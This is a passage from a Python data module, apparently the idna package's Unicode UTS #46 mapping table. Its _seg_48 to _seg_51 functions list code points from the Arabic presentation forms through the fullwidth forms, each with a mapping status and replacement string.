\'\xd9\x84\xd8\xae\'),\n    (0xFCCC, \'M\', \'\xd9\x84\xd9\x85\'),\n    (0xFCCD, \'M\', \'\xd9\x84\xd9\x87\'),\n    (0xFCCE, \'M\', \'\xd9\x85\xd8\xac\'),\n    (0xFCCF, \'M\', \'\xd9\x85\xd8\xad\'),\n    (0xFCD0, \'M\', \'\xd9\x85\xd8\xae\'),\n    (0xFCD1, \'M\', \'\xd9\x85\xd9\x85\'),\n    (0xFCD2, \'M\', \'\xd9\x86\xd8\xac\'),\n    (0xFCD3, \'M\', \'\xd9\x86\xd8\xad\'),\n    (0xFCD4, \'M\', \'\xd9\x86\xd8\xae\'),\n    (0xFCD5, \'M\', \'\xd9\x86\xd9\x85\'),\n    (0xFCD6, \'M\', \'\xd9\x86\xd9\x87\'),\n    (0xFCD7, \'M\', \'\xd9\x87\xd8\xac\'),\n    (0xFCD8, \'M\', \'\xd9\x87\xd9\x85\'),\n    (0xFCD9, \'M\', \'\xd9\x87\xd9\xb0\'),\n    (0xFCDA, \'M\', \'\xd9\x8a\xd8\xac\'),\n    (0xFCDB, \'M\', \'\xd9\x8a\xd8\xad\'),\n    (0xFCDC, \'M\', \'\xd9\x8a\xd8\xae\'),\n    (0xFCDD, \'M\', \'\xd9\x8a\xd9\x85\'),\n    (0xFCDE, \'M\', \'\xd9\x8a\xd9\x87\'),\n    (0xFCDF, \'M\', \'\xd8\xa6\xd9\x85\'),\n    (0xFCE0, \'M\', \'\xd8\xa6\xd9\x87\'),\n    (0xFCE1, \'M\', \'\xd8\xa8\xd9\x85\'),\n    (0xFCE2, \'M\', \'\xd8\xa8\xd9\x87\'),\n    (0xFCE3, \'M\', \'\xd8\xaa\xd9\x85\'),\n    (0xFCE4, \'M\', \'\xd8\xaa\xd9\x87\'),\n    (0xFCE5, \'M\', \'\xd8\xab\xd9\x85\'),\n    (0xFCE6, \'M\', \'\xd8\xab\xd9\x87\'),\n    (0xFCE7, \'M\', \'\xd8\xb3\xd9\x85\'),\n    (0xFCE8, \'M\', \'\xd8\xb3\xd9\x87\'),\n    (0xFCE9, \'M\', \'\xd8\xb4\xd9\x85\'),\n    (0xFCEA, \'M\', \'\xd8\xb4\xd9\x87\'),\n    (0xFCEB, \'M\', \'\xd9\x83\xd9\x84\'),\n    (0xFCEC, \'M\', \'\xd9\x83\xd9\x85\'),\n    (0xFCED, \'M\', \'\xd9\x84\xd9\x85\'),\n    (0xFCEE, \'M\', \'\xd9\x86\xd9\x85\'),\n    (0xFCEF, \'M\', \'\xd9\x86\xd9\x87\'),\n    (0xFCF0, \'M\', \'\xd9\x8a\xd9\x85\'),\n    (0xFCF1, \'M\', \'\xd9\x8a\xd9\x87\'),\n    (0xFCF2, \'M\', \'\xd9\x80\xd9\x8e\xd9\x91\'),\n    (0xFCF3, \'M\', \'\xd9\x80\xd9\x8f\xd9\x91\'),\n    (0xFCF4, \'M\', \'\xd9\x80\xd9\x90\xd9\x91\'),\n    (0xFCF5, \'M\', \'\xd8\xb7\xd9\x89\'),\n    (0xFCF6, \'M\', \'\xd8\xb7\xd9\x8a\'),\n    (0xFCF7, \'M\', \'\xd8\xb9\xd9\x89\'),\n    (0xFCF8, \'M\', \'\xd8\xb9\xd9\x8a\'),\n    (0xFCF9, \'M\', \'\xd8\xba\xd9\x89\'),\n    (0xFCFA, \'M\', \'\xd8\xba\xd9\x8a\'),\n    (0xFCFB, \'M\', \'\xd8\xb3\xd9\x89\'),\n    (0xFCFC, \'M\', \'\xd8\xb3\xd9\x8a\'),\n    (0xFCFD, \'M\', \'\xd8\xb4\xd9\x89\'),\n    (0xFCFE, \'M\', \'\xd8\xb4\xd9\x8a\'),\n    (0xFCFF, \'M\', \'\xd8\xad\xd9\x89\'),\n    (0xFD00, \'M\', \'\xd8\xad\xd9\x8a\'),\n    (0xFD01, \'M\', \'\xd8\xac\xd9\x89\'),\n    (0xFD02, \'M\', \'\xd8\xac\xd9\x8a\'),\n    (0xFD03, \'M\', \'\xd8\xae\xd9\x89\'),\n    (0xFD04, \'M\', \'\xd8\xae\xd9\x8a\'),\n    (0xFD05, \'M\', \'\xd8\xb5\xd9\x89\'),\n    (0xFD06, \'M\', \'\xd8\xb5\xd9\x8a\'),\n    (0xFD07, \'M\', \'\xd8\xb6\xd9\x89\'),\n    (0xFD08, \'M\', \'\xd8\xb6\xd9\x8a\'),\n    (0xFD09, \'M\', \'\xd8\xb4\xd8\xac\'),\n    (0xFD0A, \'M\', \'\xd8\xb4\xd8\xad\'),\n    (0xFD0B, \'M\', \'\xd8\xb4\xd8\xae\'),\n    (0xFD0C, \'M\', \'\xd8\xb4\xd9\x85\'),\n    (0xFD0D, \'M\', \'\xd8\xb4\xd8\xb1\'),\n    (0xFD0E, \'M\', \'\xd8\xb3\xd8\xb1\'),\n    (0xFD0F, \'M\', \'\xd8\xb5\xd8\xb1\'),\n    (0xFD10, \'M\', \'\xd8\xb6\xd8\xb1\'),\n    (0xFD11, \'M\', \'\xd8\xb7\xd9\x89\'),\n    (0xFD12, \'M\', \'\xd8\xb7\xd9\x8a\'),\n    (0xFD13, \'M\', \'\xd8\xb9\xd9\x89\'),\n    (0xFD14, \'M\', \'\xd8\xb9\xd9\x8a\'),\n    (0xFD15, \'M\', \'\xd8\xba\xd9\x89\'),\n    (0xFD16, \'M\', \'\xd8\xba\xd9\x8a\'),\n    (0xFD17, \'M\', \'\xd8\xb3\xd9\x89\'),\n    (0xFD18, \'M\', \'\xd8\xb3\xd9\x8a\'),\n    (0xFD19, \'M\', \'\xd8\xb4\xd9\x89\'),\n    (0xFD1A, \'M\', \'\xd8\xb4\xd9\x8a\'),\n    (0xFD1B, \'M\', \'\xd8\xad\xd9\x89\'),\n    (0xFD1C, \'M\', \'\xd8\xad\xd9\x8a\'),\n    (0xFD1D, \'M\', \'\xd8\xac\xd9\x89\'),\n    (0xFD1E, \'M\', \'\xd8\xac\xd9\x8a\'),\n    ]\n\ndef _seg_48() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFD1F, \'M\', \'\xd8\xae\xd9\x89\'),\n    (0xFD20, \'M\', \'\xd8\xae\xd9\x8a\'),\n    (0xFD21, \'M\', \'\xd8\xb5\xd9\x89\'),\n    (0xFD22, \'M\', \'\xd8\xb5\xd9\x8a\'),\n    (0xFD23, \'M\', \'\xd8\xb6\xd9\x89\'),\n    (0xFD24, \'M\', \'\xd8\xb6\xd9\x8a\'),\n    (0xFD25, \'M\', \'\xd8\xb4\xd8\xac\'),\n    (0xFD26, \'M\', \'\xd8\xb4\xd8\xad\'),\n    (0xFD27, \'M\', \'\xd8\xb4\xd8\xae\'),\n    (0xFD28, \'M\', \'\xd8\xb4\xd9\x85\'),\n    (0xFD29, \'M\', \'\xd8\xb4\xd8\xb1\'),\n    (0xFD2A, \'M\', \'\xd8\xb3\xd8\xb1\'),\n    (0xFD2B, \'M\', \'\xd8\xb5\xd8\xb1\'),\n    (0xFD2C, \'M\', \'\xd8\xb6\xd8\xb1\'),\n    (0xFD2D, \'M\', \'\xd8\xb4\xd8\xac\'),\n    (0xFD2E, \'M\', \'\xd8\xb4\xd8\xad\'),\n    (0xFD2F, \'M\', \'\xd8\xb4\xd8\xae\'),\n    (0xFD30, \'M\', \'\xd8\xb4\xd9\x85\'),\n    (0xFD31, \'M\', \'\xd8\xb3\xd9\x87\'),\n    (0xFD32, \'M\', \'\xd8\xb4\xd9\x87\'),\n    (0xFD33, \'M\', \'\xd8\xb7\xd9\x85\'),\n    (0xFD34, \'M\', \'\xd8\xb3\xd8\xac\'),\n    (0xFD35, \'M\', \'\xd8\xb3\xd8\xad\'),\n    (0xFD36, \'M\', \'\xd8\xb3\xd8\xae\'),\n    (0xFD37, \'M\', \'\xd8\xb4\xd8\xac\'),\n    (0xFD38, \'M\', \'\xd8\xb4\xd8\xad\'),\n    (0xFD39, \'M\', \'\xd8\xb4\xd8\xae\'),\n    (0xFD3A, \'M\', \'\xd8\xb7\xd9\x85\'),\n    (0xFD3B, \'M\', \'\xd8\xb8\xd9\x85\'),\n    (0xFD3C, \'M\', \'\xd8\xa7\xd9\x8b\'),\n    (0xFD3E, \'V\'),\n    (0xFD50, \'M\', \'\xd8\xaa\xd8\xac\xd9\x85\'),\n    (0xFD51, \'M\', \'\xd8\xaa\xd8\xad\xd8\xac\'),\n    (0xFD53, \'M\', \'\xd8\xaa\xd8\xad\xd9\x85\'),\n    (0xFD54, \'M\', \'\xd8\xaa\xd8\xae\xd9\x85\'),\n    (0xFD55, \'M\', \'\xd8\xaa\xd9\x85\xd8\xac\'),\n    (0xFD56, \'M\', \'\xd8\xaa\xd9\x85\xd8\xad\'),\n    (0xFD57, \'M\', \'\xd8\xaa\xd9\x85\xd8\xae\'),\n    (0xFD58, \'M\', \'\xd8\xac\xd9\x85\xd8\xad\'),\n    (0xFD5A, \'M\', \'\xd8\xad\xd9\x85\xd9\x8a\'),\n    (0xFD5B, \'M\', \'\xd8\xad\xd9\x85\xd9\x89\'),\n    (0xFD5C, \'M\', \'\xd8\xb3\xd8\xad\xd8\xac\'),\n    (0xFD5D, \'M\', \'\xd8\xb3\xd8\xac\xd8\xad\'),\n    (0xFD5E, \'M\', \'\xd8\xb3\xd8\xac\xd9\x89\'),\n    (0xFD5F, \'M\', \'\xd8\xb3\xd9\x85\xd8\xad\'),\n    (0xFD61, \'M\', \'\xd8\xb3\xd9\x85\xd8\xac\'),\n    (0xFD62, \'M\', \'\xd8\xb3\xd9\x85\xd9\x85\'),\n    (0xFD64, \'M\', \'\xd8\xb5\xd8\xad\xd8\xad\'),\n    (0xFD66, \'M\', \'\xd8\xb5\xd9\x85\xd9\x85\'),\n    (0xFD67, \'M\', \'\xd8\xb4\xd8\xad\xd9\x85\'),\n    (0xFD69, \'M\', \'\xd8\xb4\xd8\xac\xd9\x8a\'),\n    (0xFD6A, \'M\', \'\xd8\xb4\xd9\x85\xd8\xae\'),\n    (0xFD6C, \'M\', \'\xd8\xb4\xd9\x85\xd9\x85\'),\n    (0xFD6E, \'M\', \'\xd8\xb6\xd8\xad\xd9\x89\'),\n    (0xFD6F, \'M\', \'\xd8\xb6\xd8\xae\xd9\x85\'),\n    (0xFD71, \'M\', \'\xd8\xb7\xd9\x85\xd8\xad\'),\n    (0xFD73, \'M\', \'\xd8\xb7\xd9\x85\xd9\x85\'),\n    (0xFD74, \'M\', \'\xd8\xb7\xd9\x85\xd9\x8a\'),\n    (0xFD75, \'M\', \'\xd8\xb9\xd8\xac\xd9\x85\'),\n    (0xFD76, \'M\', \'\xd8\xb9\xd9\x85\xd9\x85\'),\n    (0xFD78, \'M\', \'\xd8\xb9\xd9\x85\xd9\x89\'),\n    (0xFD79, \'M\', \'\xd8\xba\xd9\x85\xd9\x85\'),\n    (0xFD7A, \'M\', \'\xd8\xba\xd9\x85\xd9\x8a\'),\n    (0xFD7B, \'M\', \'\xd8\xba\xd9\x85\xd9\x89\'),\n    (0xFD7C, \'M\', \'\xd9\x81\xd8\xae\xd9\x85\'),\n    (0xFD7E, \'M\', \'\xd9\x82\xd9\x85\xd8\xad\'),\n    (0xFD7F, \'M\', \'\xd9\x82\xd9\x85\xd9\x85\'),\n    (0xFD80, \'M\', \'\xd9\x84\xd8\xad\xd9\x85\'),\n    (0xFD81, \'M\', \'\xd9\x84\xd8\xad\xd9\x8a\'),\n    (0xFD82, \'M\', \'\xd9\x84\xd8\xad\xd9\x89\'),\n    (0xFD83, \'M\', \'\xd9\x84\xd8\xac\xd8\xac\'),\n    (0xFD85, \'M\', \'\xd9\x84\xd8\xae\xd9\x85\'),\n    (0xFD87, \'M\', \'\xd9\x84\xd9\x85\xd8\xad\'),\n    (0xFD89, \'M\', \'\xd9\x85\xd8\xad\xd8\xac\'),\n    (0xFD8A, \'M\', \'\xd9\x85\xd8\xad\xd9\x85\'),\n    (0xFD8B, \'M\', \'\xd9\x85\xd8\xad\xd9\x8a\'),\n    (0xFD8C, \'M\', \'\xd9\x85\xd8\xac\xd8\xad\'),\n    (0xFD8D, \'M\', \'\xd9\x85\xd8\xac\xd9\x85\'),\n    (0xFD8E, \'M\', \'\xd9\x85\xd8\xae\xd8\xac\'),\n    (0xFD8F, \'M\', \'\xd9\x85\xd8\xae\xd9\x85\'),\n    (0xFD90, \'X\'),\n    (0xFD92, \'M\', \'\xd9\x85\xd8\xac\xd8\xae\'),\n    (0xFD93, \'M\', \'\xd9\x87\xd9\x85\xd8\xac\'),\n    (0xFD94, \'M\', \'\xd9\x87\xd9\x85\xd9\x85\'),\n    (0xFD95, \'M\', \'\xd9\x86\xd8\xad\xd9\x85\'),\n    (0xFD96, \'M\', \'\xd9\x86\xd8\xad\xd9\x89\'),\n    (0xFD97, \'M\', \'\xd9\x86\xd8\xac\xd9\x85\'),\n    (0xFD99, \'M\', \'\xd9\x86\xd8\xac\xd9\x89\'),\n    (0xFD9A, \'M\', \'\xd9\x86\xd9\x85\xd9\x8a\'),\n    (0xFD9B, \'M\', \'\xd9\x86\xd9\x85\xd9\x89\'),\n    (0xFD9C, \'M\', \'\xd9\x8a\xd9\x85\xd9\x85\'),\n    (0xFD9E, \'M\', \'\xd8\xa8\xd8\xae\xd9\x8a\'),\n    (0xFD9F, \'M\', \'\xd8\xaa\xd8\xac\xd9\x8a\'),\n    (0xFDA0, \'M\', \'\xd8\xaa\xd8\xac\xd9\x89\'),\n    (0xFDA1, \'M\', \'\xd8\xaa\xd8\xae\xd9\x8a\'),\n    (0xFDA2, \'M\', \'\xd8\xaa\xd8\xae\xd9\x89\'),\n    (0xFDA3, \'M\', \'\xd8\xaa\xd9\x85\xd9\x8a\'),\n    (0xFDA4, \'M\', \'\xd8\xaa\xd9\x85\xd9\x89\'),\n    (0xFDA5, \'M\', \'\xd8\xac\xd9\x85\xd9\x8a\'),\n    (0xFDA6, \'M\', \'\xd8\xac\xd8\xad\xd9\x89\'),\n    ]\n\ndef _seg_49() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFDA7, \'M\', \'\xd8\xac\xd9\x85\xd9\x89\'),\n    (0xFDA8, \'M\', \'\xd8\xb3\xd8\xae\xd9\x89\'),\n    (0xFDA9, \'M\', \'\xd8\xb5\xd8\xad\xd9\x8a\'),\n    (0xFDAA, \'M\', \'\xd8\xb4\xd8\xad\xd9\x8a\'),\n    (0xFDAB, \'M\', \'\xd8\xb6\xd8\xad\xd9\x8a\'),\n    (0xFDAC, \'M\', \'\xd9\x84\xd8\xac\xd9\x8a\'),\n    (0xFDAD, \'M\', \'\xd9\x84\xd9\x85\xd9\x8a\'),\n    (0xFDAE, \'M\', \'\xd9\x8a\xd8\xad\xd9\x8a\'),\n    (0xFDAF, \'M\', \'\xd9\x8a\xd8\xac\xd9\x8a\'),\n    (0xFDB0, \'M\', \'\xd9\x8a\xd9\x85\xd9\x8a\'),\n    (0xFDB1, \'M\', \'\xd9\x85\xd9\x85\xd9\x8a\'),\n    (0xFDB2, \'M\', \'\xd9\x82\xd9\x85\xd9\x8a\'),\n    (0xFDB3, \'M\', \'\xd9\x86\xd8\xad\xd9\x8a\'),\n    (0xFDB4, \'M\', \'\xd9\x82\xd9\x85\xd8\xad\'),\n    (0xFDB5, \'M\', \'\xd9\x84\xd8\xad\xd9\x85\'),\n    (0xFDB6, \'M\', \'\xd8\xb9\xd9\x85\xd9\x8a\'),\n    (0xFDB7, \'M\', \'\xd9\x83\xd9\x85\xd9\x8a\'),\n    (0xFDB8, \'M\', \'\xd9\x86\xd8\xac\xd8\xad\'),\n    (0xFDB9, \'M\', \'\xd9\x85\xd8\xae\xd9\x8a\'),\n    (0xFDBA, \'M\', \'\xd9\x84\xd8\xac\xd9\x85\'),\n    (0xFDBB, \'M\', \'\xd9\x83\xd9\x85\xd9\x85\'),\n    (0xFDBC, \'M\', \'\xd9\x84\xd8\xac\xd9\x85\'),\n    (0xFDBD, \'M\', \'\xd9\x86\xd8\xac\xd8\xad\'),\n    (0xFDBE, \'M\', \'\xd8\xac\xd8\xad\xd9\x8a\'),\n    (0xFDBF, \'M\', \'\xd8\xad\xd8\xac\xd9\x8a\'),\n    (0xFDC0, \'M\', \'\xd9\x85\xd8\xac\xd9\x8a\'),\n    (0xFDC1, \'M\', \'\xd9\x81\xd9\x85\xd9\x8a\'),\n    (0xFDC2, \'M\', \'\xd8\xa8\xd8\xad\xd9\x8a\'),\n    (0xFDC3, \'M\', \'\xd9\x83\xd9\x85\xd9\x85\'),\n    (0xFDC4, \'M\', \'\xd8\xb9\xd8\xac\xd9\x85\'),\n    (0xFDC5, \'M\', \'\xd8\xb5\xd9\x85\xd9\x85\'),\n    (0xFDC6, \'M\', \'\xd8\xb3\xd8\xae\xd9\x8a\'),\n    (0xFDC7, \'M\', \'\xd9\x86\xd8\xac\xd9\x8a\'),\n    (0xFDC8, \'X\'),\n    (0xFDCF, \'V\'),\n    (0xFDD0, \'X\'),\n    (0xFDF0, \'M\', \'\xd8\xb5\xd9\x84\xdb\x92\'),\n    (0xFDF1, \'M\', \'\xd9\x82\xd9\x84\xdb\x92\'),\n    (0xFDF2, \'M\', \'\xd8\xa7\xd9\x84\xd9\x84\xd9\x87\'),\n    (0xFDF3, \'M\', \'\xd8\xa7\xd9\x83\xd8\xa8\xd8\xb1\'),\n    (0xFDF4, \'M\', \'\xd9\x85\xd8\xad\xd9\x85\xd8\xaf\'),\n    (0xFDF5, \'M\', \'\xd8\xb5\xd9\x84\xd8\xb9\xd9\x85\'),\n    (0xFDF6, \'M\', \'\xd8\xb1\xd8\xb3\xd9\x88\xd9\x84\'),\n    (0xFDF7, \'M\', \'\xd8\xb9\xd9\x84\xd9\x8a\xd9\x87\'),\n    (0xFDF8, \'M\', \'\xd9\x88\xd8\xb3\xd9\x84\xd9\x85\'),\n    (0xFDF9, \'M\', \'\xd8\xb5\xd9\x84\xd9\x89\'),\n    (0xFDFA, \'3\', \'\xd8\xb5\xd9\x84\xd9\x89 \xd8\xa7\xd9\x84\xd9\x84\xd9\x87 \xd8\xb9\xd9\x84\xd9\x8a\xd9\x87 \xd9\x88\xd8\xb3\xd9\x84\xd9\x85\'),\n    (0xFDFB, \'3\', \'\xd8\xac\xd9\x84 \xd8\xac\xd9\x84\xd8\xa7\xd9\x84\xd9\x87\'),\n    (0xFDFC, \'M\', \'\xd8\xb1\xdb\x8c\xd8\xa7\xd9\x84\'),\n    (0xFDFD, \'V\'),\n    (0xFE00, \'I\'),\n    (0xFE10, \'3\', \',\'),\n    (0xFE11, \'M\', \'\xe3\x80\x81\'),\n    (0xFE12, \'X\'),\n    (0xFE13, \'3\', \':\'),\n    (0xFE14, \'3\', \';\'),\n    (0xFE15, \'3\', \'!\'),\n    (0xFE16, \'3\', \'?\'),\n    (0xFE17, \'M\', \'\xe3\x80\x96\'),\n    (0xFE18, \'M\', \'\xe3\x80\x97\'),\n    (0xFE19, \'X\'),\n    (0xFE20, \'V\'),\n    (0xFE30, \'X\'),\n    (0xFE31, \'M\', \'\xe2\x80\x94\'),\n    (0xFE32, \'M\', \'\xe2\x80\x93\'),\n    (0xFE33, \'3\', \'_\'),\n    (0xFE35, \'3\', \'(\'),\n    (0xFE36, \'3\', \')\'),\n    (0xFE37, \'3\', \'{\'),\n    (0xFE38, \'3\', \'}\'),\n    (0xFE39, \'M\', \'\xe3\x80\x94\'),\n    (0xFE3A, \'M\', \'\xe3\x80\x95\'),\n    (0xFE3B, \'M\', \'\xe3\x80\x90\'),\n    (0xFE3C, \'M\', \'\xe3\x80\x91\'),\n    (0xFE3D, \'M\', \'\xe3\x80\x8a\'),\n    (0xFE3E, \'M\', \'\xe3\x80\x8b\'),\n    (0xFE3F, \'M\', \'\xe3\x80\x88\'),\n    (0xFE40, \'M\', \'\xe3\x80\x89\'),\n    (0xFE41, \'M\', \'\xe3\x80\x8c\'),\n    (0xFE42, \'M\', \'\xe3\x80\x8d\'),\n    (0xFE43, \'M\', \'\xe3\x80\x8e\'),\n    (0xFE44, \'M\', \'\xe3\x80\x8f\'),\n    (0xFE45, \'V\'),\n    (0xFE47, \'3\', \'[\'),\n    (0xFE48, \'3\', \']\'),\n    (0xFE49, \'3\', \' \xcc\x85\'),\n    (0xFE4D, \'3\', \'_\'),\n    (0xFE50, \'3\', \',\'),\n    (0xFE51, \'M\', \'\xe3\x80\x81\'),\n    (0xFE52, \'X\'),\n    (0xFE54, \'3\', \';\'),\n    (0xFE55, \'3\', \':\'),\n    (0xFE56, \'3\', \'?\'),\n    (0xFE57, \'3\', \'!\'),\n    (0xFE58, \'M\', \'\xe2\x80\x94\'),\n    (0xFE59, \'3\', \'(\'),\n    (0xFE5A, \'3\', \')\'),\n    (0xFE5B, \'3\', \'{\'),\n    (0xFE5C, \'3\', \'}\'),\n    (0xFE5D, \'M\', \'\xe3\x80\x94\'),\n    ]\n\ndef _seg_50() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFE5E, \'M\', \'\xe3\x80\x95\'),\n    (0xFE5F, \'3\', \'#\'),\n    (0xFE60, \'3\', \'&\'),\n    (0xFE61, \'3\', \'*\'),\n    (0xFE62, \'3\', \'+\'),\n    (0xFE63, \'M\', \'-\'),\n    (0xFE64, \'3\', \'<\'),\n    (0xFE65, \'3\', \'>\'),\n    (0xFE66, \'3\', \'=\'),\n    (0xFE67, \'X\'),\n    (0xFE68, \'3\', \'\\\\\'),\n    (0xFE69, \'3\', \'$\'),\n    (0xFE6A, \'3\', \'%\'),\n    (0xFE6B, \'3\', \'@\'),\n    (0xFE6C, \'X\'),\n    (0xFE70, \'3\', \' \xd9\x8b\'),\n    (0xFE71, \'M\', \'\xd9\x80\xd9\x8b\'),\n    (0xFE72, \'3\', \' \xd9\x8c\'),\n    (0xFE73, \'V\'),\n    (0xFE74, \'3\', \' \xd9\x8d\'),\n    (0xFE75, \'X\'),\n    (0xFE76, \'3\', \' \xd9\x8e\'),\n    (0xFE77, \'M\', \'\xd9\x80\xd9\x8e\'),\n    (0xFE78, \'3\', \' \xd9\x8f\'),\n    (0xFE79, \'M\', \'\xd9\x80\xd9\x8f\'),\n    (0xFE7A, \'3\', \' \xd9\x90\'),\n    (0xFE7B, \'M\', \'\xd9\x80\xd9\x90\'),\n    (0xFE7C, \'3\', \' \xd9\x91\'),\n    (0xFE7D, \'M\', \'\xd9\x80\xd9\x91\'),\n    (0xFE7E, \'3\', \' \xd9\x92\'),\n    (0xFE7F, \'M\', \'\xd9\x80\xd9\x92\'),\n    (0xFE80, \'M\', \'\xd8\xa1\'),\n    (0xFE81, \'M\', \'\xd8\xa2\'),\n    (0xFE83, \'M\', \'\xd8\xa3\'),\n    (0xFE85, \'M\', \'\xd8\xa4\'),\n    (0xFE87, \'M\', \'\xd8\xa5\'),\n    (0xFE89, \'M\', \'\xd8\xa6\'),\n    (0xFE8D, \'M\', \'\xd8\xa7\'),\n    (0xFE8F, \'M\', \'\xd8\xa8\'),\n    (0xFE93, \'M\', \'\xd8\xa9\'),\n    (0xFE95, \'M\', \'\xd8\xaa\'),\n    (0xFE99, \'M\', \'\xd8\xab\'),\n    (0xFE9D, \'M\', \'\xd8\xac\'),\n    (0xFEA1, \'M\', \'\xd8\xad\'),\n    (0xFEA5, \'M\', \'\xd8\xae\'),\n    (0xFEA9, \'M\', \'\xd8\xaf\'),\n    (0xFEAB, \'M\', \'\xd8\xb0\'),\n    (0xFEAD, \'M\', \'\xd8\xb1\'),\n    (0xFEAF, \'M\', \'\xd8\xb2\'),\n    (0xFEB1, \'M\', \'\xd8\xb3\'),\n    (0xFEB5, \'M\', \'\xd8\xb4\'),\n    (0xFEB9, \'M\', \'\xd8\xb5\'),\n    (0xFEBD, \'M\', \'\xd8\xb6\'),\n    (0xFEC1, \'M\', \'\xd8\xb7\'),\n    (0xFEC5, \'M\', \'\xd8\xb8\'),\n    (0xFEC9, \'M\', \'\xd8\xb9\'),\n    (0xFECD, \'M\', \'\xd8\xba\'),\n    (0xFED1, \'M\', \'\xd9\x81\'),\n    (0xFED5, \'M\', \'\xd9\x82\'),\n    (0xFED9, \'M\', \'\xd9\x83\'),\n    (0xFEDD, \'M\', \'\xd9\x84\'),\n    (0xFEE1, \'M\', \'\xd9\x85\'),\n    (0xFEE5, \'M\', \'\xd9\x86\'),\n    (0xFEE9, \'M\', \'\xd9\x87\'),\n    (0xFEED, \'M\', \'\xd9\x88\'),\n    (0xFEEF, \'M\', \'\xd9\x89\'),\n    (0xFEF1, \'M\', \'\xd9\x8a\'),\n    (0xFEF5, \'M\', \'\xd9\x84\xd8\xa2\'),\n    (0xFEF7, \'M\', \'\xd9\x84\xd8\xa3\'),\n    (0xFEF9, \'M\', \'\xd9\x84\xd8\xa5\'),\n    (0xFEFB, \'M\', \'\xd9\x84\xd8\xa7\'),\n    (0xFEFD, \'X\'),\n    (0xFEFF, \'I\'),\n    (0xFF00, \'X\'),\n    (0xFF01, \'3\', \'!\'),\n    (0xFF02, \'3\', \'"\'),\n    (0xFF03, \'3\', \'#\'),\n    (0xFF04, \'3\', \'$\'),\n    (0xFF05, \'3\', \'%\'),\n    (0xFF06, \'3\', \'&\'),\n    (0xFF07, \'3\', \'\\\'\'),\n    (0xFF08, \'3\', \'(\'),\n    (0xFF09, \'3\', \')\'),\n    (0xFF0A, \'3\', \'*\'),\n    (0xFF0B, \'3\', \'+\'),\n    (0xFF0C, \'3\', \',\'),\n    (0xFF0D, \'M\', \'-\'),\n    (0xFF0E, \'M\', \'.\'),\n    (0xFF0F, \'3\', \'/\'),\n    (0xFF10, \'M\', \'0\'),\n    (0xFF11, \'M\', \'1\'),\n    (0xFF12, \'M\', \'2\'),\n    (0xFF13, \'M\', \'3\'),\n    (0xFF14, \'M\', \'4\'),\n    (0xFF15, \'M\', \'5\'),\n    (0xFF16, \'M\', \'6\'),\n    (0xFF17, \'M\', \'7\'),\n    (0xFF18, \'M\', \'8\'),\n    (0xFF19, \'M\', \'9\'),\n    (0xFF1A, \'3\', \':\'),\n    ]\n\ndef _seg_51() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFF1B, \'3\', \';\'),\n    (0xFF1C, \'3\', \'<\'),\n    (0xFF1D, \'3\', \'=\'),\n    (0xFF1E, \'3\', \'>\'),\n    (0xFF1F, \'3\', \'?\'),\n    (0xFF20, \'3\', \'@\'),\n    (0xFF21, \'M\', \'a\'),\n    (0xFF22, \'M\', \'b\'),\n    (0xFF23, \'M\', \'c\'),\n    (0xFF24, \'M\', \'d\'),\n    (0xFF25, \'M\', \'e\'),\n    (0xFF26, \'M\', \'f\'),\n    (0xFF27, \'M\', \'g\'),\n    (0xFF28, \'M\', \'h\'),\n    (0xFF29, \'M\', \'i\'),\n    (0xFF2A, \'M\', \'j\'),\n    (0xFF2B, \'M\', \'k\'),\n    (0xFF2C, \'M\', \'l\'),\n    (0xFF2D, \'M\', \'m\'),\n    (0xFF2E, \'M\', \'n\'),\n    (0xFF2F, \'M\', \'o\'),\n    (0xFF30, \'M\', \'p\'),\n    (0xFF31, \'M\', \'q\'),\n    (0xFF32, \'M\', \'r\'),\n    (0xFF33, \'M\', \'s\'),\n    (0xFF34, \'M\', \'t\'),\n    (0xFF35, \'M\', \'u\'),\n    (0xFF36, \'M\', \'v\'),\n    (0xFF37, \'M\', \'w\'),\n    (0xFF38, \'M\', \'x\'),\n    (0xFF39, \'M\', \'y\'),\n    (0xFF3A, \'M\', \'z\'),\n    (0xFF3B, \'3\', \'[\'),\n    (0xFF3C, \'3\', \'\\\\\'),\n    (0xFF3D, \'3\', \']\'),\n    (0xFF3E, \'3\', \'^\'),\n    (0xFF3F, \'3\', \'_\'),\n    (0xFF40, \'3\', \'`\'),\n    (0xFF41, \'M\', \'a\'),\n    (0xFF42, \'M\', \'b\'),\n    (0xFF43, \'M\', \'c\'),\n    (0xFF44, \'M\', \'d\'),\n    (0xFF45, \'M\', \'e\'),\n    (0xFF46, \'M\', \'f\'),\n    (0xFF47, \'M\', \'g\'),\n    (0xFF48, \'M\', \'h\'),\n    (0xFF49, \'M\', \'i\'),\n    (0xFF4A, \'M\', \'j\'),\n    (0xFF4B, \'M\', \'k\'),\n    (0xFF4C, \'M\', \'l\'),\n    (0xFF4D, \'M\', \'m\'),\n    (0xFF4E, \'M\', \'n\'),\n    (0xFF4F, \'M\', \'o\'),\n    (0xFF50, \'M\', \'p\'),\n    (0xFF51, \'M\', \'q\'),\n    (0xFF52, \'M\', \'r\'),\n    (0xFF53, \'M\', \'s\'),\n    (0xFF54, \'M\', \'t\'),\n    (0xFF55, \'M\', \'u\'),\n    (0xFF56, \'M\', \'v\'),\n    (0xFF57, \'M\', \'w\'),\n    (0xFF58, \'M\', \'x\'),\n    (0xFF59, \'M\', \'y\'),\n    (0xFF5A, \'M\', \'z\'),\n    (0xFF5B, \'3\', \'{\'),\n    (0xFF5C, \'3\', \'|\'),\n    (0xFF5D, \'3\', \'}\'),\n    (0xFF5E, \'3\', \'~\'),\n    (0xFF5F, \'M\', \'\xe2\xa6\x85\'),\n    (0xFF60, \'M\', \'\xe2\xa6\x86\'),\n    (0xFF61, \'M\', \'.\'),\n    (0xFF62, \'M\', \'\xe3\x80\x8c\'),\n    (0xFF63, \'M\', \'\xe3\x80\x8d\'),\n    (0xFF64, \'M\', \'\xe3\x80\x81\'),\n    (0xFF65, \'M\', \'\xe3\x83\xbb\'),\n    (0xFF66, \'M\', \'\xe3\x83\xb2\'),\n    (0xFF67, \'M\', \'\xe3\x82\xa1\'),\n    (0xFF68, \'M\', \'\xe3\x82\xa3\'),\n    (0xFF69, \'M\', \'\xe3\x82\xa5\'),\n    (0xFF6A, \'M\', \'\xe3\x82\xa7\'),\n    (0xFF6B, \'M\', 